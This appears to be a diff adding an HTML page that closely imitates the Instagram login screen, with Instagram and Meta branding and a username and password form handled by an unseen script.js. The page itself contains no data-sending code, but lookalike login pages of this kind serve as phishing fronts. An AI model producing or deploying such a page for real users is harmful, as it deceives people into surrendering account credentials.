@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div id="splash-screen">
+        <img src="images/logo.png" class="splash-logo" alt="Instagram">
+        <div class="splash-footer">
+            <p class="from-text">from</p>
+            <div class="meta-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="meta-icon">
+                <span class="meta-brand">Meta</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="container" id="main-content">
+        
+        <div class="left">
+            <div class="left-content">
+                <img src="images/logo.png" class="desktop-logo" alt="Instagram">
+                <h1>See everyday moments from your <span class="gradient">close friends</span>.</h1>
+                <img src="images/preview.png" class="preview" alt="Preview">
+            </div>
+        </div>
+
+        <div class="right">
+            <div class="login-container">
+                <img src="images/logo.png" class="mobile-logo" alt="Instagram Logo">
+                <p class="login-header">Log into Instagram</p>
+
+                <form id="loginForm">
+                    <input type="text" id="username" placeholder="Mobile number, username or email" required>
+                    <input type="password" id="password" placeholder="Password" required>
+                    
+                    <button type="submit" class="login-btn" id="loginBtn">
+                        <span class="btn-text">Log in</span>
+                        <div class="btn-loader"></div>
+                    </button>
+                </form>
+
+                <a href="#" class="forgot">Forgot password?</a>
+            </div>
+
+            <div class="footer-actions">
+                <button class="create-btn">Create new account</button>
+                <p class="meta-text">Meta</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
